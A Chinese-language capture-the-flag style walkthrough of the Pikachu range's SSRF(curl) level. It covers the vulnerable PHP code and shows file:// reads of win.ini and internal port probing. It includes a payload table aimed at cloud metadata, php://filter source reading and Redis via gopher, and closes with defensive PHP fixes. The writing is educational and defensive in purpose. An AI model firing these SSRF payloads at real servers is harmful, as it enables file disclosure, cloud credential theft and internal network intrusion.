# SSRF(curl) 通关笔记

> 页面给了个链接「累了吧，来读一首诗吧」。
>
> 点开一看，URL 是 `?url=http://127.0.0.1/...`——**服务器在替我们请求自己的地址。**

---

## 一、环境与目标

| 项目 | 内容 |
| --- | --- |
| 靶场 | Pikachu |
| 关卡位置 | SSRF → SSRF(curl) |
| 页面地址 | `http://pikachu/vul/ssrf/ssrf_curl.php` |
| 提交方式 | GET |
| 参数名 | `url` |
| 目标 | 让服务器请求任意地址，并把结果返回来 |

---

## 二、我的解题步骤

### 步骤 1：点那个链接

页面上有个链接：

```
累了吧,来读一首诗吧
```

指向：

```
ssrf_curl.php?url=http://127.0.0.1/vul/ssrf/ssrf_info/info1.php
```

点开，页面显示了一首诗。

**说明服务器去请求了 `http://127.0.0.1/...` 并把内容返回来了。**

### 步骤 2：看源码

```php
if(isset($_GET['url']) && $_GET['url'] != null){
    //接收前端URL没问题,但是要做好过滤,如果不做过滤,就会导致SSRF
    $URL = $_GET['url'];
    $CH = curl_init($URL);
    curl_setopt($CH, CURLOPT_HEADER, FALSE);
    curl_setopt($CH, CURLOPT_SSL_VERIFYPEER, FALSE);
    $RES = curl_exec($CH);
    curl_close($CH);
    echo $RES;
}
```

**`curl_init($_GET['url'])` + `curl_exec()` + `echo` —— 请求什么就返回什么。**

### 步骤 3：换成 file 协议读文件

```
ssrf_curl.php?url=file:///C:/Windows/win.ini
```

我实测：

| payload | 结果 |
| --- | --- |
| `file:///C:/Windows/win.ini` | **读到 win.ini，返回 33028 字节** |

返回内容：

```
; for 16-bit app support
[fonts]
[extensions]
...
```

### 步骤 4：试内网地址

```
ssrf_curl.php?url=http://127.0.0.1:3306
```

**返回的是 MySQL 的握手包（二进制乱码）或连接报错。**

按返回内容/耗时，就能判断端口开没开。

### 步骤 5：读内网应用

```
ssrf_curl.php?url=http://127.0.0.1/vul/ssrf/ssrf_info/info2.php
```

**能读到只有本机能访问的页面。**

---

## 三、原理分析

### 3.1 完整链路

```
攻击者传 url
      ↓
服务端 curl_init($url) + curl_exec()
      ↓
服务器（不是攻击者）去请求这个地址
      ↓
结果 echo 回页面
```

### 3.2 为什么 curl 危险

| 特性 | 说明 |
| --- | --- |
| **支持多种协议** | `file`、`ftp`、`gopher`、`dict` |
| 不受浏览器同源限制 | 服务端发起，想去哪去哪 |
| 能访问内网 | 服务器的网络位置 |
| 会跟随跳转 | 默认跟随 3xx（可被绕过） |

**`curl --version` 能看到它支持的协议列表。**

### 3.3 curl 支持的协议（常见）

```
ftp  ftps  gopher  gophers  http  https
imap  imaps  ldap  ldaps  pop3  pop3s
rtmp  scp  sftp  smb  smbs  telnet  tftp
```

**再加上 PHP 自己的 `file://`、`php://`，弹药非常充足。**

### 3.4 为什么 `file://` 最值得先试

```
http://127.0.0.1   →  只能证明"能访问本机"
file:///C:/...     →  直接证明"能读文件"
```

**能读文件，危害等级立刻上一个台阶。**

---

## 四、知识点与笔记

### 4.1 常用 payload

| 目标 | payload |
| --- | --- |
| 读文件 | `file:///C:/Windows/win.ini` |
| 读源码 | `php://filter/read=convert.base64-encode/resource=index.php` |
| 探测端口 | `http://127.0.0.1:3306` |
| 内网应用 | `http://127.0.0.1/admin` |
| 云元数据 | `http://169.254.169.254/latest/meta-data/` |
| 打 Redis | `gopher://127.0.0.1:6379/_...` |

### 4.2 端口探测怎么看结果

| 现象 | 含义 |
| --- | --- |
| 有响应（任意内容） | 端口开放 |
| `Connection refused` | 端口关闭 |
| 超时 | 被防火墙过滤 |
| 二进制乱码 | 开放的是非 HTTP 服务 |

**"响应时间差异"是判断内网拓扑的主要依据。**

### 4.3 `CURLOPT_FOLLOWLOCATION`

Pikachu 这关没设这个参数，**curl 默认不跟随跳转**。

如果代码里设了 `CURLOPT_FOLLOWLOCATION = true`，还可以：

```
http://your-server/redirect  →  302 到 http://127.0.0.1
```

**用跳转绕过"只允许 http"的简单校验。**

### 4.4 真实场景里的 SSRF

| 功能 | 风险 |
| --- | --- |
| 图片/文件下载 | 高（很多支持 `file://`） |
| PDF 生成 | 高（渲染远程资源） |
| 网页截图 | 高 |
| Webhook 回调 | 中 |
| RSS 订阅 | 高 |

---

## 五、和 fgc 那关的区别

| | ssrf_curl | ssrf_fgc |
| --- | --- | --- |
| 函数 | `curl_exec()` | `file_get_contents()` |
| 参数名 | `url` | `file` |
| 支持协议 | 更丰富（gopher、dict） | PHP wrapper 为主 |
| 典型利用 | 打内网服务 | 读源码 |

**同一个漏洞，两个不同的"枪"。**

---

## 六、防御怎么写

### 6.1 协议白名单

```php
$parsed = parse_url($url);
$scheme = strtolower($parsed['scheme'] ?? '');

if (!in_array($scheme, ['http', 'https'], true)) {
    exit('只允许 http/https');
}
```

### 6.2 域名白名单

```php
$allowHosts = ['images.example.com', 'cdn.example.com'];
$host = strtolower($parsed['host'] ?? '');

if (!in_array($host, $allowHosts, true)) {
    exit('域名不在白名单');
}
```

### 6.3 禁止内网 IP

```php
$ip = gethostbyname($host);
if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
    exit('不允许访问内网');
}
```

**`FILTER_FLAG_NO_PRIV_RANGE` 会挡掉 `10.x`、`172.16-31.x`、`192.168.x`。**

### 6.4 关闭跳转

```php
curl_setopt($CH, CURLOPT_FOLLOWLOCATION, false);
```

### 6.5 最彻底：不用用户传的 URL

```php
$map = ['1' => 'https://cdn.example.com/a.png'];
$url = $map[$_GET['id']] ?? die('非法');
```

---

## 七、总结

| 要点 | 内容 |
| --- | --- |
| 这关教什么 | curl 接收用户 URL = SSRF |
| 关键代码 | `curl_init($_GET['url'])` |
| payload | `file:///C:/Windows/win.ini` |
| 实测 | 读到 win.ini，33028 字节 |
| 修复 | 协议白名单 + 禁内网 |

**一句话**：

> **curl 是"服务器的嘴巴"——你让服务器去问谁，它就去问谁。**

---

## 参考

- [OWASP: SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- [PHP: curl_setopt](https://www.php.net/manual/zh/function.curl-setopt.php)
- [Pikachu 源码](https://github.com/zhuifengshaonianhanlu/pikachu)
